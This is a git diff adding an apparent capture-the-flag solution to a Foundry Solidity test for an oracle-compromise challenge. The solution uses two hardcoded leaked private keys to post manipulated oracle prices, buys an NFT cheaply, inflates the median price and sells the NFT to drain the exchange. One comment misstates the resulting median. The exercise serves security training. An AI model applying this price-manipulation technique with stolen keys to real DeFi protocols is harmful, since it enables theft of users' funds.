@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,45 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // magical private keys
+        address source1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address source2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        // change median price to 0.1 ether
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE); // 0.1 ether
+        vm.stopPrank();
+        console.log(oracle.getMedianPrice("DVNFT")); // median([0, 0.1 ether, INITIAL_NFT_PRICE (999 ether)]) => 0.1 ether
+
+        // buy one nft for 0.1 ether
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        console.logUint(id);
+        vm.stopPrank();
+
+        // change median price to 999.1 ether
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 1000 ether);
+        vm.stopPrank();
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 999.1 ether);
+        vm.stopPrank();
+        console.log(oracle.getMedianPrice("DVNFT")); // [INITIAL_NFT_PRICE (999 ether) , 999.1 ether,1000 ether] => 0.1 ether
+
+        // sell nft for 999.1 ether
+        vm.startPrank(player);
+        exchange.token().approve(address(exchange), id);
+        exchange.sellOne(id); // recover all funds
+        payable(recovery).transfer(INITIAL_NFT_PRICE); // transfer 999 ether to recovery
+        vm.stopPrank();
+
+        // reset initial median price
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
     }
 
     /**
